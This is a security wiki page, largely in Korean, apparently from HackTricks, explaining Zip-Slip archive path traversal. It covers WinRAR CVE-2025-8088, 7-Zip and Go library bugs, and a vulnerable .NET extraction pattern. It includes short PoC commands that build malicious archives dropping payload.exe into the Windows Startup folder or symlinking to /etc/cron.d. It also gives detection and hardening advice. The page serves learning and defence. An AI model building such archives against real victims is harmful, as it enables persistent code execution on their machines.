# Archive Extraction Path Traversal ("Zip-Slip" / WinRAR CVE-2025-8088)

{{#include ../banners/hacktricks-training.md}}

## 개요

많은 아카이브 형식(ZIP, RAR, TAR, 7-ZIP 등)은 각 항목에 자체 **내부 경로**를 포함할 수 있습니다. 추출 도구가 해당 경로를 검증 없이 그대로 사용하면, `..` 또는 **절대 경로**(예: `C:\Windows\System32\`)가 포함된 조작된 파일명이 사용자가 선택한 디렉터리 외부에 기록됩니다.
이 유형의 취약점은 일반적으로 *Zip-Slip* 또는 **archive extraction path traversal**로 알려져 있습니다.

그 결과 임의의 파일을 덮어쓸 수 있으며, Windows *Startup* 폴더와 같은 **auto-run** 위치에 payload를 저장하여 직접 **remote code execution (RCE)**을 달성할 수도 있습니다.

## 근본 원인

1. 공격자는 하나 이상의 파일 헤더에 다음 항목이 포함된 아카이브를 생성합니다:
* 상대 경로 traversal 시퀀스(`..\..\..\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\payload.exe`)
* 절대 경로(`C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\payload.exe`)
* 또는 대상 디렉터리 외부로 해석되는 조작된 **symlinks** (*nix의 ZIP/TAR에서 일반적).
2. 피해자는 내장된 경로를 신뢰하거나 symlinks를 따르는 취약한 도구를 사용해 아카이브를 추출합니다. 이 도구는 해당 경로를 sanitise하거나 선택한 디렉터리 아래로만 추출하도록 강제하지 않습니다.
3. 파일이 공격자가 제어하는 위치에 기록되고, 다음에 시스템 또는 사용자가 해당 경로를 트리거할 때 실행되거나 로드됩니다.

### .NET `Path.Combine` + `ZipArchive` traversal

일반적인 .NET anti-pattern은 의도한 대상 경로와 **사용자가 제어하는** `ZipArchiveEntry.FullName`을 결합한 뒤 경로 정규화 없이 추출하는 것입니다:<sup>[[4]](#references)</sup>
```csharp
using (var zip = ZipFile.OpenRead(zipPath))
{
foreach (var entry in zip.Entries)
{
var dest = Path.Combine(@"C:\samples\queue\", entry.FullName); // drops base if FullName is absolute
entry.ExtractToFile(dest);
}
}
```
- `entry.FullName`이 `..\\`로 시작하면 traversal이 발생하며, **absolute path**인 경우 왼쪽 구성 요소가 완전히 삭제되어 extraction identity로 **arbitrary file write**가 발생합니다.
- scheduled scanner가 감시하는 sibling `app` 디렉터리에 쓰기 위한 Proof-of-concept archive:
```python
import zipfile
with zipfile.ZipFile("slip.zip", "w") as z:
z.writestr("../app/0xdf.txt", "ABCD")
```
모니터링되는 inbox에 해당 ZIP을 넣으면 `C:\samples\app\0xdf.txt`가 생성되어 `C:\samples\queue\` 외부로의 traversal이 가능함을 입증하고, 후속 primitive(예: DLL hijacks)를 사용할 수 있습니다.

## Real-World Example – WinRAR ≤ 7.12 (CVE-2025-8088)

Windows용 WinRAR( `rar` / `unrar` CLI, DLL 및 portable source 포함)는 extraction 중 filename을 검증하지 못했습니다.
다음과 같은 entry를 포함한 malicious RAR archive는:
```text
..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.exe
```
는 선택한 출력 디렉터리 **외부**이자 사용자의 *Startup* 폴더 내부에 위치하게 됩니다. 로그온 후 Windows는 해당 폴더에 있는 모든 항목을 자동으로 실행하므로, *persistent* RCE가 가능해집니다.<sup>[[5]](#references)</sup>

### PoC Archive 제작 (Linux/Mac)
```bash
# Requires rar >= 6.x
mkdir -p "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cp payload.exe "evil/../../../Users/Public/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"
rar a -ep evil.rar evil/*
```
사용된 옵션:
* `-ep`  – 파일 경로를 지정된 그대로 저장합니다(앞의 `./`를 **제거하지 않음**).

`evil.rar`를 피해자에게 전달하고, 취약한 WinRAR build로 압축을 해제하도록 안내합니다.

### 실제 환경에서 관찰된 Exploitation

ESET은 CVE-2025-8088을 악용하는 RAR archive를 첨부하여 맞춤형 backdoor를 배포하고 ransomware 작업을 지원한 RomCom (Storm-0978/UNC2596)의 spear-phishing 캠페인을 보고했습니다.<sup>[[5]](#references)</sup>

## 최신 사례 (2024–2025)

### 7-Zip ZIP symlink traversal → RCE (CVE-2025-11001 / ZDI-25-949)
* **Bug**: ZIP entry가 **symbolic link**인 경우 extraction 중 dereference되어, 공격자가 destination directory를 벗어나 임의의 경로를 덮어쓸 수 있었습니다. 사용자의 동작은 archive를 *열거나 extraction하는 것*뿐입니다.<sup>[[1]](#references)</sup>
* **Affected**: 7-Zip 21.02–24.09 (Windows 및 Linux builds). **25.00** (2025년 7월) 이상에서 수정되었습니다.
* **Impact path**: `Start Menu/Programs/Startup` 또는 service-run 위치를 덮어씀 → 다음 logon 또는 service restart 시 code가 실행됩니다.
* **Quick PoC (Linux)**:
```bash
mkdir -p out
ln -s /etc/cron.d evil
zip -y exploit.zip evil   # -y preserves symlinks
7z x exploit.zip -o/tmp/target   # vulnerable 7-Zip writes to /etc/cron.d
```
patched build에서는 `/etc/cron.d`가 변경되지 않으며, symlink는 `/tmp/target` 내부에서 link로 extraction됩니다.

### Go mholt/archiver Unarchive() Zip-Slip (CVE-2025-3445)
* **Bug**: `archiver.Unarchive()`가 `../` 및 symlink된 ZIP entry를 따라가며 `outputDir` 외부에 write합니다.<sup>[[2]](#references)</sup>
* **Affected**: `github.com/mholt/archiver` ≤ 3.5.1 (현재 project는 deprecated 상태).
* **Fix**: `mholt/archives` ≥ 0.1.0으로 전환하거나 write 전에 canonical-path check를 구현합니다.
* **Minimal reproduction**:
```go
// go test . with archiver<=3.5.1
archiver.Unarchive("exploit.zip", "/tmp/safe")
// exploit.zip holds ../../../../home/user/.ssh/authorized_keys
```

## Detection Tips

* **Static inspection** – archive entry를 나열하고 `../`, `..\\`, *absolute path* (`/`, `C:`)가 포함된 이름 또는 target이 extraction dir 외부를 가리키는 *symlink* 유형의 entry를 flag합니다.
* **Canonicalisation** – `realpath(join(dest, name))`이 여전히 `dest`로 시작하는지 확인합니다. 그렇지 않으면 reject합니다.<sup>[[3]](#references)</sup>
* **Sandbox extraction** – *safe* extractor(예: `bsdtar --safe --xattrs --no-same-owner`, 7-Zip ≥ 25.00)를 사용하여 disposable directory로 decompress하고, 생성된 path가 directory 내부에 유지되는지 확인합니다.
* **Endpoint monitoring** – WinRAR/7-Zip 등으로 archive를 연 직후 `Startup`/`Run`/`cron` 위치에 새 executable이 write되면 alert를 생성합니다.

## Mitigation & Hardening

1. **Extractor를 update** – WinRAR 7.13+ 및 7-Zip 25.00+는 path/symlink sanitisation을 구현합니다. 두 tool 모두 auto-update는 지원하지 않습니다.
2. 가능한 경우 “**Do not extract paths**” / “**Ignore paths**”를 사용하여 archive를 extraction합니다.
3. Unix에서는 extraction 전에 privilege를 drop하고 **chroot/namespace**를 mount합니다. Windows에서는 **AppContainer** 또는 sandbox를 사용합니다.
4. Custom code를 작성하는 경우 create/write **전에** `realpath()`/`PathCanonicalize()`로 normalise하고, destination을 벗어나는 entry는 reject합니다.

## 추가 Affected / 과거 사례

* 2018 – Snyk가 다수의 Java/Go/JS library에 영향을 주는 대규모 *Zip-Slip* advisory를 발표.
* 2023 – `-ao` merge 중 유사한 traversal이 발생하는 7-Zip CVE-2023-4011.
* 2025 – HashiCorp `go-slug` (CVE-2025-0377)의 slug TAR extraction traversal (v1.2에서 patch).
* write 전에 `PathCanonicalize` / `realpath` 호출에 실패하는 모든 custom extraction logic.

## References

- [1] [Trend Micro ZDI-25-949 – 7-Zip symlink ZIP traversal (CVE-2025-11001)](https://www.zerodayinitiative.com/advisories/ZDI-25-949/)
- [2] [JFrog Research – mholt/archiver Zip-Slip (CVE-2025-3445)](https://research.jfrog.com/vulnerabilities/archiver-zip-slip/)
- [3] [Meziantou – .NET에서 Zip Slip 방지](https://www.meziantou.net/prevent-zip-slip-in-dotnet.htm)
- [4] [0xdf – HTB Bruno ZipSlip → DLL hijack chain](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [ESET Research – 지금 WinRAR tools를 update하십시오: RomCom 및 기타 threat actor가 zero-day vulnerability (CVE-2025-8088)를 exploit](https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/)

{{#include ../banners/hacktricks-training.md}}
